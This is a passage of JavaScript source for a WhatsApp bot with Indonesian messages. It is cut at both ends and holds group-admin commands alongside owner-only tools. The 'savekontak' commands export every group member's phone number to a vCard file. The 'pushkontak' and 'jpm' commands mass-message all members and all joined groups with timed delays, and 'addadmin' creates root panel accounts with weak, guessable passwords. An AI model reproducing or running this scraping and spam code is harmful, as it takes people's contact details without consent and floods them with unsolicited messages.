fadhost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {

if (!isGroup) return fadhostReply(msg.group)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fadhost.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {

if (!isGroup) return fadhostReply(msg.group)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fadhost.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "add": case "addmember": {

if (!isGroup) return fadhostReply(msg.group)
if (!args[0]) return m.reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await fadhost.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return m.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await fadhost.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await fadhost.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => fadhost.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {

if (!isGroup) return fadhostReply(msg.group)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
fadhost.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {

if (!isGroup) return fadhostReply(msg.group)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!text) return m.reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
fadhost.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "owner": case "creator": {

fadhost.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break
case "savekontak": {

if (!isOwner) return fadhostReply(msg.owner)
if (!isGroup) return fadhostReply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await fadhost.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await fadhost.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await fadhost.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {

if (!isOwner) return fadhostReply(msg.owner)
if (!isGroup) return fadhostReply(msg.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await fadhost.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await fadhost.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await fadhost.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await fadhost.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await fadhost.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak2": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await fadhost.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await fadhost.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await fadhost.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {

if (!isOwner) return fadhostReply(msg.owner)
if (!isGroup) return fadhostReply(msg.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await fadhost.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
fadhost.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "joingc": case "join": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text && !m.quoted) return m.reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return m.reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await fadhost.groupAcceptInvite(result).then(respon => m.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => m.reply(error.toString()))
}
break
case "leave": case "leavegc": {

if (!isOwner) return fadhostReply(msg.owner)
if (!isGroup) return fadhostReply(msg.group)
await m.reply("Otw Abangkuhh🔥")
await sleep(3000)
await fadhost.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {

if (!isOwner) return fadhostReply(msg.owner)
let gcall = await Object.values(await fadhost.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
m.reply(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return m.reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await m.reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await fadhost.groupLeave(`${gcall[leav].id}`)
}}
break
case "scbot": case "sc": 
case "scriptbot": {

if (isOwner) {
m.reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `Zarxdoficial`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await fadhost.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script ${namabot}*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*

*➡️ Youtube :*
${global.linkyt}

*➡️ Grup Jualan :*
${global.linkgc}

*➡️ Testimoni :*
${global.linksaluran}`
fadhost.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 10000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "done": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("Nama Barang\n\n*Contoh :* Panel Unlimited"))
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
var teks = `
_*Alhamdulillah Next Order Cik✅*_

━━━━━━━━━━━━━━━━━━━━━━
📦 *${text}*
⏰ ${tanggal(Date.now())}
💫 Status : Done✅
━━━━━━━━━━━━━━━━━━━━━━
*🪀 WhatsApp:https://wa.me/6285783089587

> MY GROUP¹ : https://chat.whatsapp.com/ENeYALf1SBm8pgBRJykw4L

> BERBAGI SALURAN : https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e

>TESTIMONI :
━━━━━━━━━━━━━━━━━━━━━━

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 👑
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️

⌕ █║▌║▌║ - ║▌║▌║█ ⌕
© *</ Zarxd - Dev />*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Youtube\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Telegram\",\"url\":\"${global.linktele}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await fadhost.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "startjpm": {
if (!isOwner) return fadhostReply(msg.owner)
var teksnya = await fs.readFileSync("./all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await fadhost.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmhidetag": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await fadhost.sendMessage(jid, {text: teks, mentions: allfetch[jid].participants.map(e => e.id)}, {quoted: qchanel})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
await fadhost.sendMessage(jid, {text: teks}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await fadhost.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await fadhost.downloadAndSaveMediaMessage(qmsg)
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
fadhost.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await fadhost.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return m.reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let allfetch = await fadhost.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: fadhost.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await fadhost.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "addadmin": {
if (!text) return m.reply(example("username"))
if (!isOwner) return fadhostReply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addadmin2": {
if (!text) return m.reply(example("nama,6283XXX"))
if (!isOwner) return fadhostReply(msg.owner)
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await fadhost.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
